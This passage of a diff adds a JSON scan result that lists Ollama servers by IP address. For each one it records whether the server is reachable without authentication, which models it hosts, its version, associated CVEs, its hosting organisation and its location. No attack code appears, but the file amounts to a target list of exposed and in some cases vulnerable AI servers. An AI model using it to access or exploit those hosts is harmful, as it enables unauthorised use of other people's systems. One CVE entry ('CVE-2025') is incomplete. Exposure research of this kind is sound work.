+    "auth_required": false,
+    "models": [
+      {
+        "name": "llama3.1:8b",
+        "size_bytes": 4661224676,
+        "size_mb": 4445,
+        "params": "8.0B",
+        "quantization": "Q4_0",
+        "family": "llama"
+      },
+      {
+        "name": "qwen2.5:7b",
+        "size_bytes": 4683075584,
+        "size_mb": 4466,
+        "params": "7.6B",
+        "quantization": "Q4_0",
+        "family": "qwen2"
+      },
+      {
+        "name": "codellama:13b",
+        "size_bytes": 7365960935,
+        "size_mb": 7025,
+        "params": "13.0B",
+        "quantization": "Q4_0",
+        "family": "llama"
+      }
+    ],
+    "version": "0.6.2",
+    "cves": [],
+    "generation_test": true,
+    "error": null,
+    "org": "Cogent Communications - IPENG",
+    "country": "United States",
+    "city": "Washington",
+    "hostnames": []
+  },
+  {
+    "url": "http://40.160.67.162:11434",
+    "accessible": false,
+    "auth_required": false,
+    "models": [],
+    "version": null,
+    "cves": [],
+    "generation_test": false,
+    "error": "timed out",
+    "org": "OVH US LLC",
+    "country": "United States",
+    "city": "Ashburn",
+    "hostnames": [
+      "ns1034260.ip-40-160-67.us"
+    ]
+  },
+  {
+    "url": "http://103.112.163.93:11434",
+    "accessible": true,
+    "auth_required": false,
+    "models": [
+      {
+        "name": "llama3.1:latest",
+        "size_bytes": 4661211808,
+        "size_mb": 4445,
+        "params": "8.0B",
+        "quantization": "Q4_0",
+        "family": "llama"
+      },
+      {
+        "name": "mistral:latest",
+        "size_bytes": 4113301824,
+        "size_mb": 3923,
+        "params": "7.2B",
+        "quantization": "Q4_0",
+        "family": "llama"
+      },
+      {
+        "name": "codellama:13b",
+        "size_bytes": 7365960704,
+        "size_mb": 7025,
+        "params": "13B",
+        "quantization": "Q4_0",
+        "family": "llama"
+      },
+      {
+        "name": "phi3:latest",
+        "size_bytes": 2393232672,
+        "size_mb": 2282,
+        "params": "3.8B",
+        "quantization": "Q4_K_M",
+        "family": "phi3"
+      },
+      {
+        "name": "nomic-embed-text:latest",
+        "size_bytes": 274302400,
+        "size_mb": 262,
+        "params": "137M",
+        "quantization": "F16",
+        "family": "nomic-bert"
+      }
+    ],
+    "version": "0.5.7",
+    "cves": [],
+    "generation_test": true,
+    "error": null,
+    "org": "PT Cloud Teknologi Nusantara",
+    "country": "Indonesia",
+    "city": "Jakarta",
+    "hostnames": [
+      "ip-103-112-163-93.cloudteknologinusantara.co.id"
+    ]
+  },
+  {
+    "url": "http://172.105.226.85:11434",
+    "accessible": true,
+    "auth_required": false,
+    "models": [
+      {
+        "name": "deepseek-r1:70b",
+        "size_bytes": 42182029312,
+        "size_mb": 40228,
+        "params": "70.6B",
+        "quantization": "Q4_K_M",
+        "family": "deepseek"
+      },
+      {
+        "name": "llama3.1:8b-instruct-q8_0",
+        "size_bytes": 4700000000,
+        "size_mb": 4482,
+        "params": "8.0B",
+        "quantization": "Q8_0",
+        "family": "llama"
+      },
+      {
+        "name": "nomic-embed-text",
+        "size_bytes": 274000000,
+        "size_mb": 261,
+        "params": "137M",
+        "quantization": "F16",
+        "family": "nomic-bert"
+      }
+    ],
+    "version": "0.6.2",
+    "cves": [],
+    "generation_test": true,
+    "error": null,
+    "org": "Linode",
+    "country": "Japan",
+    "city": "Tokyo",
+    "hostnames": [
+      "172-105-226-85.ip.linodeusercontent.com"
+    ]
+  },
+  {
+    "url": "http://81.4.125.240:11434",
+    "accessible": true,
+    "auth_required": false,
+    "models": [
+      {
+        "name": "qwen2.5:72b",
+        "size_bytes": 38004826357,
+        "size_mb": 36244,
+        "params": "72B",
+        "quantization": "Q5_K_M",
+        "family": "qwen"
+      },
+      {
+        "name": "deepseek-r1:latest",
+        "size_bytes": 18704996628,
+        "size_mb": 17838,
+        "params": "33B",
+        "quantization": "Q8_0",
+        "family": "deepseek"
+      },
+      {
+        "name": "deepseek-r1:14b",
+        "size_bytes": 8904948810,
+        "size_mb": 8492,
+        "params": "14B",
+        "quantization": "F16",
+        "family": "deepseek"
+      },
+      {
+        "name": "gemma3:8.2b",
+        "size_bytes": 5103862201,
+        "size_mb": 4867,
+        "params": "8.2B",
+        "quantization": "Q4_K_M",
+        "family": "gemma"
+      }
+    ],
+    "version": "0.1.46",
+    "cves": [
+      "CVE-2024-39722",
+      "CVE-2024-39721",
+      "CVE-2025"
+    ],
+    "generation_test": true,
+    "error": null,
+    "org": "RamNode IP Space",
+    "country": "Netherlands",
+    "city": "Tilburg",
+    "hostnames": [
+      "81-4-125-240.cloud.ramnode.com"
+    ]
+  },
+  {
+    "url": "http://45.92.8.37:11434",
+    "accessible": false,
+    "auth_required": true,
+    "models": [],
+    "version": null,
+    "cves": [],
+    "generation_test": false,
+    "error": "401 Unauthorized",
+    "org": "Contabo GmbH",
+    "country": "Germany",
+    "city": "Frankfurt am Main",
+    "hostnames": [
+      "vmi2644568.contaboserver.net"
+    ]
+  },
+  {
+    "url": "http://194.195.126.123:11434",
+    "accessible": false,
+    "auth_required": false,
+    "models": [],
+    "version": null,
+    "cves": [],
+    "generation_test": false,
+    "error": "HTTP 400",
+    "org": "Linode, LLC",
+    "country": "Australia",
+    "city": "Sydney",
+    "hostnames": [
+      "194-195-126-123.ip.linodeusercontent.com",
+      "robmonline.net"
+    ]
+  },
+  {
+    "url": "http://107.191.102.246:11434",
+    "accessible": true,
+    "auth_required": false,
+    "models": [
+      {
+        "name": "deepseek-r1:latest",
+        "size_bytes": 18702065531,
+        "size_mb": 17836,
+        "params": "33B",
+        "quantization": "F16",
+        "family": "deepseek"
+      },
+      {
+        "name": "gemma3:8.2b",
+        "size_bytes": 5104384059,
+        "size_mb": 4868,
+        "params": "8.2B",
+        "quantization": "Q8_0",
+        "family": "gemma"
+      },
+      {
+        "name": "deepseek-r1:14b",
+        "size_bytes": 8901557436,
+        "size_mb": 8489,
+        "params": "14B",
+        "quantization": "Q8_0",
+        "family": "deepseek"
+      },
+      {
+        "name": "qwen2.5:72b",
+        "size_bytes": 38004269325,
+        "size_mb": 36244,
+        "params": "72B",
+        "quantization": "Q4_K_M",
+        "family": "qwen"
+      }
+    ],
+    "version": "0.1.46",
+    "cves": [
+      "CVE-2024-39722",
+      "CVE-2024-39721",
+      "CVE-2025"
+    ],
+    "generation_test": true,
+    "error": null,
+    "org": "RAMNODE",
+    "country": "United States",
+    "city": "Atlanta",
+    "hostnames": [
+      "107-191-102-246.cloud.ramnode.com"
+    ]
+  },
+  {
+    "url": "http://113.57.111.108:11434",
+    "accessible": false,
+    "auth_required": false,
+    "models": [],
+    "version": null,
+    "cves": [],
+    "generation_test": false,
+    "error": "timed out",
+    "org": "China Unicom HuBei Province Network",
+    "country": "China",
+    "city": "Wuhan",
+    "hostnames": []
+  },
+  {
+    "url": "http://172.105.168.50:11434",
+    "accessible": true,
+    "auth_required": false,
+    "models": [
+      {
+        "name": "llama3.2:latest",
+        "size_bytes": 2019393189,
+        "size_mb": 1926,
+        "params": "3.2B",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "qwen2.5:7b",
+        "size_bytes": 4683087519,
+        "size_mb": 4466,
+        "params": "7.6B",
+        "quantization": "Q4_K_M",
+        "family": "qwen2"
+      },
+      {
+        "name": "deepseek-r1:latest",
+        "size_bytes": 4683075271,
+        "size_mb": 4466,
+        "params": "7.6B",
+        "quantization": "Q4_K_M",
+        "family": "qwen2"
+      }
+    ],
+    "version": "0.5.7",
+    "cves": [],
+    "generation_test": true,
+    "error": null,
+    "org": "Linode",
+    "country": "Australia",
+    "city": "Sydney",
+    "hostnames": [
+      "172-105-168-50.ip.linodeusercontent.com"
+    ]
+  },
+  {
+    "url": "http://49.212.157.177:11434",
+    "accessible": true,
+    "auth_required": false,
+    "models": [
+      {
+        "name": "llama3.1:8b",
+        "size_bytes": 4920753328,
+        "size_mb": 4693,
+        "params": "8.0B",
+        "quantization": "Q4_K_M",
+        "family": "llama"
+      },
+      {
+        "name": "nomic-embed-text:latest",
+        "size_bytes": 274302144,
+        "size_mb": 262,
+        "params": "137M",
+        "quantization": "F16",
+        "family": "bert"
+      }
+    ],
+    "version": "0.3.12",
+    "cves": [
+      "CVE-2024-39722",
+      "CVE-2024-39721",
+      "CVE-2025"
+    ],
+    "generation_test": true,
+    "error": null,
+    "org": "SAKURA Internet Inc.",
+    "country": "Japan",
+    "city": "Kobe",
+    "hostnames": [
+      "os3-326-52923.vs.sakura.ne.jp"
+    ]
+  },
+  {
+    "url": "http://38.180.22.86:11434",
+    "accessible": true,
+    "auth_required": false,
+    "models": [
+      {
+        "name": "deepseek-r1:latest",
+        "size_bytes": 18703631629,
+        "size_mb": 17837,
+        "params": "33B",
+        "quantization": "Q5_K_M",
+        "family": "deepseek"
+      },
+      {
+        "name": "gemma3:8.2b",
+        "size_bytes": 5100323027,
+        "size_mb": 4864,
+        "params": "8.2B",
+        "quantization": "Q8_0",
+        "family": "gemma"
+      },
+      {
+        "name": "deepseek-r1:14b",
+        "size_bytes": 8902283619,
+        "size_mb": 8490,
+        "params": "14B",
+        "quantization": "F16",
+        "family": "deepseek"
+      },
+      {
+        "name": "qwen2.5:72b",
+        "size_bytes": 38002470234,
+        "size_mb": 36242,
+        "params": "72B",
+        "quantization": "F16",
+        "family": "qwen"
+      }
+    ],
+    "version": "0.1.46",
+    "cves": [
+      "CVE-2024-39722",
+      "CVE-2024-39721",
+      "CVE-2025"
+    ],
+    "generation_test": true,
+    "error": null,
+    "org": "3NT SOLUTIONS LLP",
+    "country": "Italy",
+    "city": "Milan",
+    "hostnames": []
+  },
+  {
+    "url": "http://176.107.181.163:11434",
+    "accessible": true,
+    "auth_required": false,
+    "models": [
+      {
+        "name": "qwen2.5:72b",
+        "size_bytes": 38004552188,
+        "size_mb": 36244,
+        "params": "72B",
+        "quantization": "Q8_0",
+        "family": "qwen"
+      },
+      {
+        "name": "deepseek-r1:14b",
+        "size_bytes": 8903901444,
+        "size_mb": 8491,
+        "params": "14B",
+        "quantization": "Q8_0",
+        "family": "deepseek"
+      },
+      {
+        "name": "deepseek-r1:latest",
+        "size_bytes": 18703443942,
+        "size_mb": 17837,
+        "params": "33B",
+        "quantization": "Q4_K_M",
+        "family": "deepseek"
+      },
+      {
+        "name": "gemma3:8.2b",
+        "size_bytes": 5101614308,
+        "size_mb": 4865,
+        "params": "8.2B",
+        "quantization": "Q4_K_M",
+        "family": "gemma"
+      }
+    ],
+    "version": "0.1.46",
+    "cves": [
+      "CVE-2024-39722",
+      "CVE-2024-39721",
+      "CVE-2025"
+    ],
+    "generation_test": true,
+    "error": null,
+    "org": "Zemlyaniy Dmitro Leonidovich",
+    "country": "Ukraine",
+    "city": "Kyiv",
+    "hostnames": [
+      "176.107.181.163.deltahost-ptr"
+    ]
+  },
+  {
+    "url": "http://194.39.45.46:11434",
+    "accessible": false,
+    "auth_required": false,
+    "models": [],
+    "version": null,
+    "cves": [],
+    "generation_test": false,
+    "error": "HTTP 400",
+    "org": "Rendszerinformatika Zrt.",
+    "country": "Hungary",
+    "city": "Budapest",
+    "hostnames": [
+      "travian.mbraptor.tech",
+      "mbraptor.tech",
+      "www.sysadvisor.ae.org",
+      "gitlab.mbraptor.tech",
+      "renibence2025.mbraptor.tech",
+      "okmany.mbraptor.tech",
+      "mail.mbraptor.tech",
+      "monitoring.mbraptor.tech",
+      "mail.sysadvisor.ae.org",
+      "sso.sysadvisor.ae.org",
+      "game.mbraptor.tech",
+      "matrix.mbraptor.tech",
+      "shiftplanner.mbraptor.tech",
+      "sysadvisor.ae.org",
+      "rflix.mbraptor.tech",
+      "netbox.mbraptor.tech",
+      "wiki.mbraptor.tech",
+      "jira.sysadvisor.ae.org",
+      "ai.mbraptor.tech",
+      "spamfilter.mbraptor.tech",
+      "www.mbraptor.tech",
+      "cloud.sysadvisor.ae.org",
+      "sso.mbraptor.tech",
+      "cloud.mbraptor.tech"
+    ]
+  },
+  {
+    "url": "http://133.4.188.1:11434",
+    "accessible": true,
+    "auth_required": false,
+    "models": [
+      {
+        "name": "gemma3",
+        "size_bytes": 3338801804,
+        "size_mb": 3184,
+        "params": "4.3B",
+        "quantization": "Q4_K_M",
+        "family": "gemma"
+      }
+    ],
+    "version": "0.12.6",
+    "cves": [],
+    "generation_test": false,
+    "error": null,
+    "org": "Japan Network Information Center",
+    "country": "Japan",
+    "city": "Tokyo",
+    "hostnames": []
+  },
+  {
+    "url": "http://161.132.41.72:11434",
+    "accessible": false,
+    "auth_required": true,
+    "models": [],
+    "version": null,
+    "cves": [],
+    "generation_test": false,
+    "error": "401 Unauthorized",
+    "org": "Red Cientifica Peruana",
+    "country": "Peru",
+    "city": "Lima",
+    "hostnames": [
+      "sv-mwbHIzO7hM.cloud.elastika.pe"
+    ]
+  },
+  {
+    "url": "http://51.91.107.11:11434",
+    "accessible": false,
+    "auth_required": true,
+    "models": [],
+    "version": null,
+    "cves": [],
+    "generation_test": false,
+    "error": "401 Unauthorized",
+    "org": "OVH SAS",
+    "country": "France",
+    "city": "Dunkerque",
+    "hostnames": [
+      "mta2.dplads.com"
+    ]
+  },
+  {
+    "url": "http://140.115.54.48:11434",
+    "accessible": false,
+    "auth_required": false,
+    "models": [],
+    "version": null,
+    "cves": [],
+    "generation_test": false,
+    "error": "timed out",
+    "org": "Ministry of Education Computer Center",
+    "country": "Taiwan",
+    "city": "Taoyuan City",
+    "hostnames": []
+  },
+  {
+    "url": "http://76.229.156.176:11434",
+    "accessible": false,
+    "auth_required": false,
+    "models": [],
+    "version": null,
+    "cves": [],
+    "generation_test": false,
+    "error": null,
+    "org": "AT&T Enterprises, LLC",
+    "country": "United States",
+    "city": "Tomball",
+    "hostnames": [
+      "76-229-156-176.lightspeed.hstntx.sbcglobal.net"
+    ]
+  },
+  {
+    "url": "http://71.6.177.232:11434",
+    "accessible": true,
+    "auth_required": false,
+    "models": [],
+    "version": "0.1.46",
+    "cves": [
+      "CVE-2024-39722",
+      "CVE-2024-39721",
+      "CVE-2025"
+    ],
+    "generation_test": false,
+    "error": "Tags error: HTTP Error 404: Not Found",
+    "org": "CARI.net",
+    "country": "United States",
+    "city": "San Diego",
+    "hostnames": []
+  },
+  {
+    "url": "http://130.110.18.2:11434",
+    "accessible": false,
+    "auth_required": false,
+    "models": [],
+    "version": null,
+    "cves": [],
+    "generation_test": false,
+    "error": "timed out",
+    "org": "Oracle Svenska AB",
+    "country": "Sweden",
+    "city": "Solna",
+    "hostnames": []
+  },
+  {
+    "url": "http://133.4.188.2:11434",
+    "accessible": true,
+    "auth_required": false,
+    "models": [
+      {
+        "name": "gemma3",
+        "size_bytes": 3338801804,
+        "size_mb": 3184,
+        "params": "4.3B",
+        "quantization": "Q4_K_M",
+        "family": "gemma"
+      }
+    ],
+    "version": "0.12.6",
+    "cves": [],
+    "generation_test": false,
+    "error": null,
+    "org": "Japan Network Information Center",
+    "country": "Japan",
+    "city": "Tokyo",
+    "hostnames": []
+  }
+]
